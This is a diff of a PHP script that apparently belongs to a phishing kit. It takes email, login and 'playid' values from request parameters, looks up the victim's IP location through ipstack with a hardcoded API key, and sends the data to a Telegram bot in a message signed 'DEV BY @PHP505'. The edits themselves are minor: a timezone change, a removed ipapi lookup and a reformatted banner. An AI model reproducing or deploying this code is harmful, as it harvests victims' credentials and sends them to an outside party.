@@ -15,7 +15,7 @@ function bot($method,$datas=[]){
     }else{
         $ip = $_SERVER['REMOTE_ADDR'];
     }
-date_default_timezone_set('Asia/Baghdad');
+date_default_timezone_set('Africa/Cairo');
 $time = date('h:i');
 $year = date('Y');
 $month = date('n');
@@ -38,9 +38,6 @@ $login = $_GET["login"];
 $playid = $_GET['playid'];
 
 $linky = $_SERVER['HTTP_HOST'];
-$code4 = file_get_contents('https://ipapi.co/8.8.8.8/json/');
-$jsondata = json_decode($code4);
-$code4 = $jsondata->country_calling_code;
 if($email){
 $api_key = "26dc150b1cf3c41dc866400812300e6d";
 $cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
@@ -67,7 +64,7 @@ bot("sendMessage",[
    ☎️ • 𝙲𝚘𝚍𝚎 » `$code4`
    ⏲️ • 𝚃𝚒𝚖𝚎 » $time
    📝 • 𝙳𝚊𝚝𝚎 » $day/$month/$year
-╰───────•𝙳𝙴𝚅 𝙱𝚈 @PHP505•───────╯
+╰─────•𝙳𝙴𝚅 𝙱𝚈 @PHP505•──────╯
 ",
 'parse_mode'=>"MarkDown",
 'disable_web_page_preview'=>true,
